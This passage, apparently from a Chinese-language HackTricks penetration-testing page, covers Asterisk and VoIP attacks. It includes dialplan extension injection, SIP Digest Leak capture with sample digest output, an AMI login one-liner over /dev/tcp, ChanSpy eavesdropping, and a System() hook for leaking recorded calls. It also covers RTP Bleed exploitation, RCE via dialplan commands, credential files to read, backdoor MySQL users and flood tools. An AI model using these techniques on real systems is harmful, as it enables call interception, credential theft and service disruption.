漏洞在于所指示的<strong>分机长度没有被检查，因此用户可以输入5秒超时的完整号码并进行拨打。</strong></p>
<h3 id="分机注入"><a class="header" href="#分机注入">分机注入</a></h3>
<p>使用如下分机：</p>
<pre><code class="language-scss">exten =&gt; _X.,1,Dial(SIP/${EXTEN})
</code></pre>
<p>当 <strong><code>${EXTEN}</code></strong> 是将被拨打的 <strong>分机</strong> 时，当 <strong>ext 101 被引入</strong> 时，将会发生以下情况：</p>
<pre><code class="language-scss">exten =&gt; 101,1,Dial(SIP/101)
</code></pre>
<p>然而，如果 <strong><code>${EXTEN}</code></strong> 允许输入 <strong>超过数字</strong>（如在旧版 Asterisk 中），攻击者可以输入 <strong><code>101&amp;SIP123123123</code></strong> 来拨打电话号码 123123123。这将是结果：</p>
<pre><code class="language-scss">exten =&gt; 101&amp;SIP123123123,1,Dial(SIP/101&amp;SIP123123123)
</code></pre>
<p>因此，对分机 <strong><code>101</code></strong> 和 <strong><code>123123123</code></strong> 的呼叫将被发送，只有第一个接到电话的分机会建立连接……但是如果攻击者使用一个 <strong>绕过任何匹配</strong> 的分机，该分机并不存在，他可以 <strong>仅向所需号码注入一个呼叫</strong>。</p>
<h2 id="sipdigestleak-漏洞"><a class="header" href="#sipdigestleak-漏洞">SIPDigestLeak 漏洞</a></h2>
<p>SIP Digest Leak 是一个影响大量 SIP 电话的漏洞，包括硬件和软件 IP 电话以及电话适配器（VoIP 转模拟）。该漏洞允许 <strong>泄露 Digest 认证响应</strong>，该响应是根据密码计算的。然后可以进行 <strong>离线密码攻击</strong>，并根据挑战响应恢复大多数密码。</p>
<p>**<a href="https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf">漏洞场景来自这里**</a>:</p>
<ol>
<li>一部 IP 电话（受害者）在任何端口上监听（例如：5060），接受电话呼叫</li>
<li>攻击者向 IP 电话发送 INVITE</li>
<li>受害者电话开始响铃，有人接听并挂断（因为另一端没有人接电话）</li>
<li>当电话挂断时，<strong>受害者电话向攻击者发送 BYE</strong></li>
<li><strong>攻击者发出 407 响应</strong>，<strong>请求认证</strong>并发出认证挑战</li>
<li><strong>受害者电话在第二个 BYE 中提供对认证挑战的响应</strong></li>
<li><strong>攻击者可以在他的本地机器上（或分布式网络等）对挑战响应进行暴力破解攻击</strong>并猜测密码</li>
</ol>
<ul>
<li><strong>SIPPTS 漏洞</strong>来自 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS 漏洞利用了影响大量 SIP 电话的 SIP Digest Leak 漏洞。输出可以以 SipCrack 格式保存，以便使用 SIPPTS dcrack 或 SipCrack 工具进行暴力破解。</li>
</ul>
<pre><code class="language-bash">sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=&gt;] Request INVITE
[&lt;=] Response 100 Trying
[&lt;=] Response 180 Ringing
[&lt;=] Response 200 OK
[=&gt;] Request ACK
... waiting for BYE ...
[&lt;=] Received BYE
[=&gt;] Request 407 Proxy Authentication Required
[&lt;=] Received BYE with digest
[=&gt;] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
</code></pre>
<h3 id="click2call"><a class="header" href="#click2call">Click2Call</a></h3>
<p>Click2Call 允许一个 <strong>网络用户</strong>（例如可能对某个产品感兴趣） <strong>提供</strong> 他的 <strong>电话号码</strong> 以接收电话。然后会拨打一个商业电话，当他 <strong>接听电话</strong> 时，用户将 <strong>被呼叫并与代理连接</strong>。</p>
<p>一个常见的 Asterisk 配置文件是：</p>
<pre><code class="language-scss">[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
</code></pre>
<ul>
<li>之前的配置允许 <strong>任何 IP 地址连接</strong>（如果已知密码）。</li>
<li>要 <strong>组织一个电话</strong>，如前所述，<strong>不需要读取权限</strong>，<strong>只需要</strong> <strong>在</strong> <strong>写入</strong> 中 <strong>发起</strong>。</li>
</ul>
<p>拥有这些权限的任何知道密码的 IP 都可以连接并提取过多信息，例如：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Get all the peers
exec 3&lt;&gt;/dev/tcp/10.10.10.10/5038 &amp;&amp; echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n"&gt;&amp;3 &amp;&amp; cat &lt;&amp;3
</code></pre>
<p>{% endcode %}</p>
<p><strong>可以请求更多信息或操作。</strong></p>
<h3 id="窃听"><a class="header" href="#窃听"><strong>窃听</strong></a></h3>
<p>在 Asterisk 中，可以使用命令 <strong><code>ChanSpy</code></strong> 指定要监控的 <strong>分机</strong>（或所有分机）来听取正在进行的对话。此命令需要分配给一个分机。</p>
<p>例如，<strong><code>exten =&gt; 333,1,ChanSpy('all',qb)</code></strong> 表示如果您 <strong>拨打</strong> <strong>分机 333</strong>，它将 <strong>监控</strong> <strong><code>all</code></strong> 分机，<strong>开始监听</strong> 每当新的对话开始时 (<strong><code>b</code></strong>) 以静音模式 (<strong><code>q</code></strong>) 进行，因为我们不想参与其中。您可以通过按 <strong><code>*</code></strong> 或标记分机号码在进行中的对话之间切换。</p>
<p>也可以使用 <strong><code>ExtenSpy</code></strong> 仅监控一个分机。</p>
<p>除了监听对话外，还可以使用分机将其 <strong>录制到文件中</strong>，例如：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-scss">[recorded-context]
exten =&gt; _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten =&gt; _X.,2,MixMonitor(${NAME})
</code></pre>
<p>{% endcode %}</p>
<p>通话将保存在 <strong><code>/tmp</code></strong>。</p>
<p>您甚至可以让 Asterisk <strong>执行一个在通话结束时泄露通话的脚本</strong>。</p>
<pre><code class="language-scss">exten =&gt; h,1,System(/tmp/leak_conv.sh &amp;)
</code></pre>
<h3 id="rtcpbleed-漏洞"><a class="header" href="#rtcpbleed-漏洞">RTCPBleed 漏洞</a></h3>
<p><strong>RTCPBleed</strong> 是一个影响基于 Asterisk 的 VoIP 服务器的重大安全问题（发布于 2017 年）。该漏洞允许 <strong>RTP（实时传输协议）流量</strong>，即承载 VoIP 通话的流量，被 <strong>互联网上的任何人拦截和重定向</strong>。这是因为 RTP 流量在通过 NAT（网络地址转换）防火墙时绕过了身份验证。</p>
<p>RTP 代理尝试通过在两个或多个参与者之间代理 RTP 流来解决影响 RTC 系统的 <strong>NAT 限制</strong>。当 NAT 存在时，RTP 代理软件通常无法依赖通过信令（例如 SIP）获取的 RTP IP 和端口信息。因此，一些 RTP 代理实现了一种机制，使得这种 <strong>IP 和端口元组能够自动学习</strong>。这通常是通过检查传入的 RTP 流量并将任何传入 RTP 流量的源 IP 和端口标记为应响应的来完成的。这种机制，可能被称为“学习模式”，<strong>不使用任何形式的身份验证</strong>。因此，<strong>攻击者</strong> 可以 <strong>向 RTP 代理发送 RTP 流量</strong>，并接收原本应发送给正在进行的 RTP 流的呼叫者或被叫者的代理 RTP 流量。我们称这种漏洞为 RTP Bleed，因为它允许攻击者接收原本应发送给合法用户的 RTP 媒体流。</p>
<p>RTP 代理和 RTP 堆栈的另一个有趣行为是，有时 <strong>即使不易受 RTP Bleed 漏洞影响</strong>，它们仍会 <strong>接受、转发和/或处理来自任何源的 RTP 数据包</strong>。因此，攻击者可以发送 RTP 数据包，这可能允许他们注入自己的媒体，而不是合法的媒体。我们称这种攻击为 RTP 注入，因为它允许将不合法的 RTP 数据包注入到现有的 RTP 流中。此漏洞可能在 RTP 代理和端点中发现。</p>
<p>Asterisk 和 FreePBX 传统上使用 <strong><code>NAT=yes</code> 设置</strong>，这使得 RTP 流量能够绕过身份验证，可能导致通话中没有音频或单向音频。</p>
<p>有关更多信息，请查看 <a href="https://www.rtpbleed.com/">https://www.rtpbleed.com/</a></p>
<ul>
<li><strong><code>SIPPTS rtpbleed</code></strong> 来自 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS rtpbleed 通过发送 RTP 流来检测 RTP Bleed 漏洞。</li>
</ul>
<pre><code class="language-bash">sippts rtpbleed -i 10.10.0.10
</code></pre>
<ul>
<li><strong><code>SIPPTS rtcpbleed</code></strong> 来自 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS rtcpbleed 通过发送 RTCP 流来检测 RTP Bleed 漏洞。</li>
</ul>
<pre><code class="language-bash">sippts rtcpbleed -i 10.10.0.10
</code></pre>
<ul>
<li><strong><code>SIPPTS rtpbleedflood</code></strong> 来自 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS rtpbleedflood 利用 RTP Bleed 漏洞发送 RTP 流。</li>
</ul>
<pre><code class="language-bash">sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
</code></pre>
<ul>
<li><strong><code>SIPPTS rtpbleedinject</code></strong> 来自 <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS rtpbleedinject 利用 RTP Bleed 漏洞注入音频文件（WAV 格式）。</li>
</ul>
<pre><code class="language-bash">sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
</code></pre>
<h3 id="rce"><a class="header" href="#rce">RCE</a></h3>
<p>在 Asterisk 中，如果你以某种方式能够 <strong>添加扩展规则并重新加载它们</strong>（例如，通过攻陷一个易受攻击的网络管理服务器），则可以使用 <strong><code>System</code></strong> 命令获得 RCE。</p>
<pre><code class="language-scss">same =&gt; n,System(echo "Called at $(date)" &gt;&gt; /tmp/call_log.txt)
</code></pre>
<p>There is command called <strong><code>Shell</code></strong> that could be used <strong>instead of <code>System</code></strong> to execute system commands if necessary.</p>
<p>{% hint style="warning" %}
如果服务器<strong>不允许在</strong><code>System</code><strong>命令中使用某些字符</strong>（如在Elastix中），请检查Web服务器是否允许<strong>以某种方式在系统内部创建文件</strong>（如在Elastix或trixbox中），并利用它<strong>创建一个后门脚本</strong>，然后使用**<code>System</code><strong>来</strong>执行<strong>该</strong>脚本**。
{% endhint %}</p>
<h4 id="有趣的本地文件和权限"><a class="header" href="#有趣的本地文件和权限">有趣的本地文件和权限</a></h4>
<ul>
<li><strong><code>sip.conf</code></strong> -&gt; 包含SIP用户的密码。</li>
<li>如果<strong>Asterisk服务器以root身份运行</strong>，您可能会危及root权限。</li>
<li><strong>mysql root用户</strong>可能<strong>没有任何密码</strong>。</li>
<li>这可以用来创建一个新的mysql用户作为后门。</li>
<li><strong><code>FreePBX</code></strong></li>
<li><strong><code>amportal.conf</code></strong> -&gt; 包含Web面板管理员（FreePBX）的密码。</li>
<li><strong><code>FreePBX.conf</code></strong> -&gt; 包含用于访问数据库的用户FreePBXuser的密码。</li>
<li>这可以用来创建一个新的mysql用户作为后门。</li>
<li><strong><code>Elastix</code></strong></li>
<li><strong><code>Elastix.conf</code></strong> -&gt; 包含多个明文密码，如mysql root密码、IMAPd密码、Web管理员密码。</li>
<li><strong>多个文件夹</strong>将属于被攻陷的asterisk用户（如果不是以root身份运行）。该用户可以读取之前的文件并控制配置，因此他可以使Asterisk在执行时加载其他后门二进制文件。</li>
</ul>
<h3 id="rtp注入"><a class="header" href="#rtp注入">RTP注入</a></h3>
<p>可以使用工具如**<code>rtpinsertsound</code><strong>（<code>sudo apt install rtpinsertsound</code>）和</strong><code>rtpmixsound</code><strong>（<code>sudo apt install rtpmixsound</code>）在对话中插入</strong><code>.wav</code>**文件。</p>
<p>或者您可以使用来自<a href="http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/">http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/</a>的脚本来<strong>扫描对话</strong>（<strong><code>rtpscan.pl</code></strong>）、向对话发送**<code>.wav</code><strong>（</strong><code>rtpsend.pl</code><strong>）并在对话中</strong>插入噪音**（<strong><code>rtpflood.pl</code></strong>）。</p>
<h3 id="dos"><a class="header" href="#dos">DoS</a></h3>
<p>有几种方法可以尝试在VoIP服务器上实现DoS。</p>
<ul>
<li>**<code>SIPPTS flood</code><strong>来自<a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a></strong>：SIPPTS洪水向目标发送无限消息。</li>
<li><code>sippts flood -i 10.10.0.10 -m invite -v</code></li>
<li>**<code>SIPPTS ping</code><strong>来自<a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a></strong>：SIPPTS ping进行SIP ping以查看服务器响应时间。</li>
<li><code>sippts ping -i 10.10.0.10</code></li>
<li><a href="https://www.kali.org/tools/iaxflood/"><strong>IAXFlooder</strong></a>: DoS IAX协议用于Asterisk。</li>
<li><a href="https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt"><strong>inviteflood</strong></a>: 一种在UDP/IP上执行SIP/SDP INVITE消息洪水的工具。</li>
<li><a href="https://www.kali.org/tools/rtpflood/"><strong>rtpflood</strong></a>: 发送多个格式良好的RTP数据包。需要知道正在使用的RTP端口（先嗅探）。</li>
<li><a href="https://github.com/SIPp/sipp"><strong>SIPp</strong></a>: 允许分析和生成SIP流量，因此也可以用于DoS。</li>
<li><a href="https://github.com/nils-ohlmeier/sipsak"><strong>SIPsak</strong></a>: SIP瑞士军刀。也可以用于执行SIP攻击。</li>
<li>Fuzzers: <a href="https://www.kali.org/tools/protos-sip/"><strong>protos-sip</strong></a>, <a href="https://github.com/gremwell/voiper"><strong>voiper</strong></a>.</li>
</ul>
<h3 id="操作系统漏洞"><a class="header" href="#操作系统漏洞">操作系统漏洞</a></h3>
<p>安装像Asterisk这样的软件最简单的方法是下载一个已经安装了它的<strong>操作系统发行版</strong>，例如：<strong>FreePBX、Elastix、Trixbox</strong>... 这些的一个问题是，一旦它工作，系统管理员可能<strong>不会再更新它们</strong>，而<strong>漏洞</strong>会随着时间的推移被发现。</p>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://github.com/Pepelux/sippts/wiki">https://github.com/Pepelux/sippts/wiki</a></li>
<li><a href="https://github.com/EnableSecurity/sipvicious">https://github.com/EnableSecurity/sipvicious</a></li>
<li><a href="http://blog.pepelux.org/">http://blog.pepelux.org/</a></li>
<li><a href="https://www.rtpbleed.com/">https://www.rtpbleed.com/</a></li>
<li><a href="https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4">https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4</a></li>
<li><a href="https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf">https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf</a></li>
</ul>
<p>{% hint style="success" %}
学习和实践AWS黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践GCP黑客攻击：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>从黑客的角度看待您的Web应用程序、网络和云</strong></p>
<p><strong>查找并报告具有实际业务影响的关键可利用漏洞。</strong> 使用我们20多个自定义工具来映射攻击面，发现让您提升权限的安全问题，并使用自动化漏洞利用收集重要证据，将您的辛勤工作转化为有说服力的报告。</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<details>
<summary>支持HackTricks</summary>
<ul>
<li>查看<a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord群组</strong></a>或<a href="https://t.me/peass"><strong>电报群组</strong></a>或<strong>在Twitter上关注</strong>我们🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>和<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub库提交PR来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/pentesting-sap.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-voip/basic-voip-protocols/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/pentesting-sap.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-voip/basic-voip-protocols/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
